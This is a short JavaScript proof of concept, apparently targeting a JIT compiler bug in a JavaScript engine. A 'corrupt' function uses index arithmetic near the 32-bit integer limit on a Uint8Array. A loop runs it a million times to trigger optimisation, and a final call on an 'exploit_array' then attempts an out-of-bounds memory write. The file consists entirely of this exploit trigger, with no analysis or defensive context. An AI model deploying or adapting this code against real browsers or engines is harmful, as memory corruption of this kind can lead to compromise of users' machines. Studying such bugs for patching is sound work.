function corrupt(a1, a2, a3) {
    var base = -2147483585 + a2;
    a1[base - -2147483648] = 75;
    a1[base + 2147483617] = 75;
    a1[base + 2147483585] = a3;
}
function trigger_optimize() {
    const v20 = new Uint8Array(64);
    var array = v20;
    for (let i23 = 0; i23 < 1000000; i23++) {
        corrupt(array, 0, 0);
    }
}
trigger_optimize();
const v35 = new Uint8Array(64);
var exploit_array = v35;
corrupt(exploit_array, -2, 128);
